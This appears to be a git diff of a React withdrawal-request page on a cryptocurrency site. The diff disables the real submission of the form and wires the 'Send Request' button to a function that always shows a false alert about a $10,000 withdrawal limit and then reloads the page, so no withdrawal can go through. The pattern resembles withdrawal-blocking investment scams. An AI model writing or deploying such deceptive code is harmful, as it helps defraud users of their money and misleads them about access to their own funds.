@@ -1,9 +1,9 @@
 import React, {useState} from 'react';
 import styled from 'styled-components';
-import Swal from 'sweetalert2'
+// import Swal from 'sweetalert2'
 import bgbg from './bgbg.jpg';
 import {AiFillHome} from 'react-icons/ai'
-import Axios from "axios";
+// import Axios from "axios";
 
 
 
@@ -17,42 +17,49 @@ const SendWithdrawReq = () => {
     const [accountNumber, setAcctnumber] = useState("")
     const [amounttoWithdraw, setAmount] = useState("")
 
-    const data = {withdrawalWallet, email, yourusername, appealHeader, bankName, accountNumber, amounttoWithdraw}
-    const url = "https://newbestkryptfieldbackend.onrender.com/api/requestaccount"
+    // const data = {withdrawalWallet, email, yourusername, appealHeader, bankName, accountNumber, amounttoWithdraw}
+    // const url = "https://newbestkryptfieldbackend.onrender.com/api/requestaccount"
 
-    const sendReqest = (e) => {
-        e.preventDefault()
-        Axios.post(url, data)
-        .then((res) => {
-          console.log(res)
-          Swal.fire({
-            icon: 'success',
-            title: 'Success',
-            text: res.data.message,
-         }) 
-         setAcctnumber("")
-         setAmount("")
-         setAppeal("")
-         setBankname("")
-         setEmail("")
-         setWithdrawalWallet("")
-         setUsername("")
-        // window.location.reload();
-        }
-        )
-        .catch((error)=>{
-          console.log(error)
-        // setLoading(false)
-        Swal.fire({
-          icon: 'error',
-          title: 'Oops...',
-          text: error.response.data.message,
-       }) 
-        console.log(error)
-        //  reset(),
-      })
-        // console.log(data)
+
+    const Fail = () => {
+        alert("You can withdraw at this moment you must $10,000 above so you’ll reach the withdrawal limit.")
+        window.location.reload()
     }
+    
+
+    // const sendReqest = (e) => {
+    //     e.preventDefault()
+    //     Axios.post(url, data)
+    //     .then((res) => {
+    //       console.log(res)
+    //       Swal.fire({
+    //         icon: 'success',
+    //         title: 'Success',
+    //         text: res.data.message,
+    //      }) 
+    //      setAcctnumber("")
+    //      setAmount("")
+    //      setAppeal("")
+    //      setBankname("")
+    //      setEmail("")
+    //      setWithdrawalWallet("")
+    //      setUsername("")
+    //     // window.location.reload();
+    //     }
+    //     )
+    //     .catch((error)=>{
+    //       console.log(error)
+    //     // setLoading(false)
+    //     Swal.fire({
+    //       icon: 'error',
+    //       title: 'Oops...',
+    //       text: error.response.data.message,
+    //    }) 
+    //     console.log(error)
+    //     //  reset(),
+    //   })
+    //     // console.log(data)
+    // }
 
   return (
     <Container>
@@ -132,7 +139,7 @@ const SendWithdrawReq = () => {
                         <Input2 placeholder='describe your question / issue'/>
                     </InputHold2> */}
                     <InputHold2>
-                    <Button onClick={(e) => sendReqest(e)}>Send Request</Button>
+                    <Button onClick={Fail}>Send Request</Button>
                     </InputHold2>
             </Form>
         </Wrapper2>
